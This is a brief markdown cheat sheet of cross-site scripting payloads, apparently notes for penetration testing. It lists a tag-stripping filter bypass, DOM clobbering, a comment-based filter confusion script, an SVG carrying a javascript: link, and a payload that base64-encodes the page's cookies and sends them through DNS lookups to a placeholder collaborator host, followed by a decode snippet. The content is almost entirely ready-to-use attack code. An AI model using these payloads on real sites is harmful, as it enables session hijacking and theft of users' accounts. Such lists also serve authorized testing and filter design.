# Snippets 

#### xss filter bypass with \</p> tag stripping    
`<</p>iframe src=javascript:alert()//`

#### DOM Clobbering XSS    
```html 
<iframe name=windowplz>
</iframe>
<script>
windowplz.alert(1)
</script>
```

#### filter confusing 
```html
<script>
  x='<!--<script>'/*</script>-->*/;alert(1)
</script>
```

#### SVG embeded payload 
```html
<?xml version="1.0" standalone="no"?>
<svg viewBox="0 0 100 100" xmlns="http://w3.org/2000/svg">
  <a href="javascript&#9;:alert(1)">
    <circle cx="50" cy="40" r="35"/>
  </a>
</svg>
```

#### cookie theft over DNS while XSS 
```html
<script> document.location = "//" + btoa(document.cookie).replace(/[A-Z]/g, '$&.').replace(/=/g, 'X') + "I." + "YourBurpCollaborator"; </script>
```
Decode:
```hmtl
atob("Your_Receveived_DNS".replace(/(.)./g, (_,x)=>x.toUpperCase()))
```
